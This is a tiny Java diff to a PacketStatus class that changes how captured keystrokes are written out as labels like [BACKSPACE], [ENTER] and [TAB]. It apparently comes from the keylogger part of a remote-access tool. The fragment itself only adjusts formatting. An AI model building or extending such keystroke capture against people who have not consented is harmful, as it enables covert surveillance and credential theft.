@@ -24,7 +24,7 @@ public class PacketStatus extends PacketListener {
 
 					if (ckey == '\b') {
 						key = "[BACKSPACE]";
-					} else if (ckey == '\n' || ckey == '\r') {
+					} else if (ckey == '\n') {
 						key = "[ENTER]\r\n";
 					} else if (ckey == '\t') {
 						key = "[TAB]\t";
